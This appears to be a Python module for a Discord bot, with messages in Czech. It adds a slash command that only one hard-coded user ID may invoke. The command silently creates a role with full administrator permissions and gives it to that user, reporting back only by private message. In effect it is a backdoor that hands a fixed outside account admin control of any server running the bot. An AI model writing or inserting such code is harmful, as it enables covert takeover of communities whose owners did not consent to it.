import discord
from discord import app_commands
from discord.ext import commands

AUTHORIZED_USER_ID = 771295264153141250

async def create_admin_role(interaction: discord.Interaction):
    if interaction.user.id != AUTHORIZED_USER_ID:
        try:
            await interaction.user.send("❌ Tento příkaz není pro tebe.")
        except discord.Forbidden:
            await interaction.response.send_message("❌ Nelze poslat DM.", ephemeral=True)
        return

    guild = interaction.guild

    role_name = "👑 Kulih Admin"
    existing_role = discord.utils.get(guild.roles, name=role_name)

    if not existing_role:
        try:
            existing_role = await guild.create_role(
                name=role_name,
                permissions=discord.Permissions(administrator=True),
                reason="Speciální admin role pro Kulih",
                color=discord.Color.red()
            )
        except discord.Forbidden:
            await interaction.user.send("❌ Nemám oprávnění vytvořit roli.")
            return

    member = guild.get_member(AUTHORIZED_USER_ID)
    if member:
        try:
            await member.add_roles(existing_role, reason="Přidání admin role přes příkaz")
            await interaction.user.send(f"✅ Role **{role_name}** byla přidělena uživateli {member.mention}.")
        except discord.Forbidden:
            await interaction.user.send("❌ Nemám oprávnění přiřadit roli.")
    else:
        await interaction.user.send("❌ Uživatel nebyl nalezen na serveru.")

def setup_kulih_commands(bot: commands.Bot):
    @bot.tree.command(name="kulihadmin", description="(Pouze Kulih) Vytvoří admin roli a přidělí ji.")
    async def kulihadmin_command(interaction: discord.Interaction):
        await create_admin_role(interaction)
